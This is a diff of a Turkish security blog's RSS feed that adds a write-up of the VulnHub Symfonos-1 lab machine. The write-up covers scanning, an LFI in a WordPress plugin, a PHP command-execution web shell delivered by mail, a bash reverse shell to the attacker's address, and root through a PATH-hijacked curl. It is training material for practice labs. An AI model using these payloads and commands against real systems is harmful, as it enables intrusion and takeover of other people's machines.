@@ -5,8 +5,244 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Sat, 03 Oct 2020 13:30:54 +0300</lastBuildDate>
+        <lastBuildDate>Sun, 04 Oct 2020 18:13:49 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB Symfonos-1 Write up</title>
+            <link>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</link>
+            <pubDate>Sun, 04 Oct 2020 18:13:49 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
+İlk olarak tasarımcı tarafından belirtilen alan adı /etc/hosts dosyasına ip adresi symfonos.local şeklinde eklenir.
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/symfonos-1,322/">VULNHUB</a> &lsquo;da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
+<p>İlk olarak tasarımcı tarafından belirtilen alan adı <em>/etc/hosts</em> dosyasına <code>ip adresi  symfonos.local</code> şeklinde eklenir.</p>
+
+    <img src="/images/vulnhub/symfonos1/desc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.114
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 07:36 CDT
+Nmap scan report for 192.168.56.114 (192.168.56.114)
+Host is up (0.00011s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
+|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
+|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
+25/tcp  open  smtp        Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
+| ssl-cert: Subject: commonName=symfonos
+| Subject Alternative Name: DNS:symfonos
+| Not valid before: 2019-06-29T00:29:42
+|_Not valid after:  2029-06-26T00:29:42
+|_ssl-date: TLS randomness does not represent time
+80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:47:66:4F (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
+|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.5.16-Debian)
+|   Computer name: symfonos
+|   NetBIOS computer name: SYMFONOS\x00
+|   Domain name: \x00
+|   FQDN: symfonos
+|_  System time: 2020-10-03T10:36:35-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-10-03T15:36:35
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
+</code></pre><p>İlk göze çarpan 139 ve 445 numaralı portlarda çalışan Samba ve 25 numaralı portta çalışan mail servisidir.</p>
+<p>Samba servisinde paylaşıma açık olan dosya ve klasörler <em>smbclient</em> ile kontrol edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  -L //192.168.56.114/
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/smb1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Şifresiz paylaşıma açık olan anonymous dizini kontrol edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient //192.168.56.114/anonymous
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/smb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>get</strong> komutu ile dosya indirilir ve içeriği görüntülenir.</p>
+
+    <img src="/images/vulnhub/symfonos1/atten.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Zeus efendi kullanıcıların aynı parolaları kullanmalarından epeyce kızmış anlaşılan&hellip; 🤣</p>
+<p>helios klasörüne <em>qwerty</em> parolası ile erişim sağlanmaktadır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  //192.168.56.114/helios -U helios
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/smb3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Paylaşılan dosyalar get komutu ile indirilir ve içerikleri görüntülenir. Yapılacaklar adlı dosyada <strong>/h3l105</strong> dizini dikkat çekmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos1/todo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Tarayıcı ile web servisine istek atılır. Açılan sayfada sadece bir resim vardır. Daha sonra elde edilen dizine (<code>http://symfonos.local/h3l105</code>) istek atıldığında wordpress uygulaması karşımıza çıkmaktadır.</p>
+
+    <img src="/images/vulnhub/symfonos1/web2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>Wpscan</strong> aracı ile web sayfasında tarama yapılır. Wordpress sürümü, sistemdeki kullanıcılar vb. bir çok bilgi tespit edilir. Upload klasörünün erişime açık olduğu bilgisi dikkat çekmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Uploads klasörüne girildiğinde <strong>siteeditor</strong> adında klasör görülmektedir. Yapılan araştırma wordpress plugin olduğu ve uygulamaya ait <em>LFI</em> açığı olduğu tespit edilmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos1/expdb.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Exploit detaylarına bakıldığında lfi zafiyetinin olduğu dizin ve parametreler aşağıda görülmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos1/expdb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>/etc/passwd dosyasını okunmaya çalışılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</code></pre></div><p>
+    <img src="/images/vulnhub/symfonos1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+Bu aşamadan sonra mail servisinde keşif yapılır. smtp-user-enum aracı ile helios kullanıcısı doğrulaması gerçekleştirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smtp-user-enum -u helios -t 192.168.56.114
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Sat Oct  3 08:13:56 2020 #########
+192.168.56.114: helios exists
+######## Scan completed at Sat Oct  3 08:13:56 2020 #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)
+</code></pre><p><strong>Helios</strong> kullanıcısına mail servisinden zararlı kodun bulunduğu bir mail gönderilir. LFI ile mail okunarak zararlı kod çalıştırılır.</p>
+<p>İlk olarak <strong>nc</strong> veya <strong>telnet</strong> ile smtp servisine bağlanılır.</p>
+<pre><code class="language-terminal" data-lang="terminal">nc 192.168.56.114 25
+</code></pre><pre><code>**En önemli SMTP komutları aşağıdaki gibidir.
+
+HELP: Komutlar listelenir.
+HELO: SMTP sunucusu ile SMTP iletişimi başlatılır.
+EHLO: Genişletilmiş SMTP iletişimi için kullanılır.
+AUTH: İstemcinin kimlik doğrulaması için kullanılır.
+MAIL FROM: E-posta göndericisi belirtilir.
+RCPT TO: E-posta alıcısı belirtilir.
+DATA: E-postanın içeriği belirtilir. E-posta içeriği, “.” ifadesi içeren satır ile tamamlanmış olur.
+SUBJECT: E-postanın konusu belirtilir.
+QUIT: Oturum sonlandırılır.
+VRFY: E-posta kutusu alıcısı doğrulanır.
+EXPN: E-posta listesi doğrulanır.
+STARTTLS: SMTP iletişimi TLS üzerinden başlatılır.
+RSET: E-posta iletişimi kesilir.
+</code></pre>
+<p>Yukarıdaki komutlar çerçevesinde root kullanıcısından helios kullanıcısına cmd parametresi ile gönderilen komutun çalıştırılabileceği php kodu gönderilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span>
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ nc 192.168.56.114 25
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+helo symfonos@localdomain
+250 symfonos.localdomain
+mail from:root@symfonos.localdomain
+250 2.1.0 Ok
+rcpt to:helios@symfonos.localdomain
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+&lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;
+.
+250 2.0.0 Ok: queued as D547140698
+</code></pre><p>Tarayıcından <em>/var/mail/</em> dizini altında helios kullanıcısının maillerinin tutulduğu helios dosyası okunarak zararlı kod çalıştırılır. İlk olarak <em><strong>cmd=ls -l</strong></em> test edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios<span style="color:#960050;background-color:#1e0010">&amp;</span>cmd=ls -l
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/lfi2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p><code>cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1'</code> şeklinde istek atılarak  4444 numaralı porttan <strong>helios</strong> kullanıcısı yetkisi ile terminal bağlantısı sağlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;cmd=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1&#39;
+</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Python pty modülü kullanılarak etkileşimli kabuğa geçilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><p>İlk olarak <code>sudo -l</code> komutu çalıştırıldığında, komut bulunamadı hatası ile karşılaşılır. Sistem de suid biti aktif dosyalar için araştırma yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</code></pre></div>
+    <img src="/images/vulnhub/symfonos1/suid.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>/opt dizini altında yer alan <strong>statuscheck</strong> adlı uygulama dikkat çekmektedir. Dosya sahibinin root olduğu görülmektedir.</p>
+
+    <img src="/images/vulnhub/symfonos1/own.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Uygulama çalıştırıldığında apache sunucusuna istek atıldığı dönen paketin header bilgisinin ekrana basıldığı görülmektedir. Strings aracı ile uygulama içerisinde yer alan string ifadeler çıkarılır.</p>
+
+    <img src="/images/vulnhub/symfonos1/content.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Curl komutu ile localhosta istek atıldığı görülmektedir. Ayrıca curl komutu için tam path verilmemiştir. Bu kapsamda;</p>
+<ol>
+<li><em>/home/helios</em> dizininde curl adında bir dosya oluşturulur.</li>
+<li><em><strong>curl</strong></em> dosyası içerisine shell oturumu için kodlar eklenir.</li>
+<li><strong>PATH</strong> değişkeninin başına curl dosya pathi eklenir.</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; curl
+export PATH<span style="color:#f92672">=</span>/home/helios:$PATH
+/opt/statuscheck
+</code></pre></div><p>Dosya çalıştırıldığında root yetkisi ile oturum elde edilir.</p>
+
+    <img src="/images/vulnhub/symfonos1/priv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Proof.txt okunarak makina çözümleri tamamlanır.</p>
+
+    <img src="/images/vulnhub/symfonos1/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB DC-4 Write Up</title>
